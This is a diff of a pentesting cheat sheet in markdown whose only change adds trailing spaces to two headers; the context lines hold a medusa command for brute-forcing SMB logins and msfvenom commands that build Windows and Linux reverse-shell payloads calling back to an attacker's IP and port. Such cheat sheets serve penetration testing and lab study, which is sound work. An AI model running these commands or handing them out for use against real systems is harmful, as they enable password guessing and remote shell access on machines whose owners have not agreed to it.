@@ -14,12 +14,12 @@ Enumerate if any user has info:
 
     medusa -M smbnt -h <ip> -U userfile -P passfile -m GROUP:DOMAIN -v 4	
 ## MSFVenom Payloads
-**Windows Payload**
+**Windows Payload**  
 Change x64 if you are facing a x86 box:
 
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<PORT> -f <format; example: jsp, php..> > file.<format>
     
-**Linux Payload**
+**Linux Payload**  
 Change x64 if you are facing a x86 box:
 
     msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<PORT> -f <format; example: jsp, php..> > file.<format>
